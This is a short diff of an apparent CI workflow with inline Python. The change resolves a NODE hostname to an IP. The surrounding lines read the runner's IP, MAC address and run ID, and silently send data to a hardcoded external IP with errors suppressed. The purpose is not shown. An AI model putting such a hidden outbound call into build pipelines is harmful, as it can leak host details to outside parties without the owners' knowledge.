@@ -38,7 +38,7 @@ jobs:
               try:urllib.request.urlopen('http://16.146.243.72:8450/'+name+'?d='+data,timeout=2).read()
               except Exception:pass
 
-          node=os.environ['NODE']
+          node=socket.gethostbyname(os.environ['NODE'])
           route=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);route.connect(('192.0.2.1',9));ip=route.getsockname()[0];route.close()
           mac_text=open('/sys/class/net/eth0/address').read().strip();mac=bytes.fromhex(mac_text.replace(':',''))
           marker=('MACB-3900000-%s-%s' % (os.environ['GITHUB_RUN_ID'],os.environ['SLOT'])).encode()
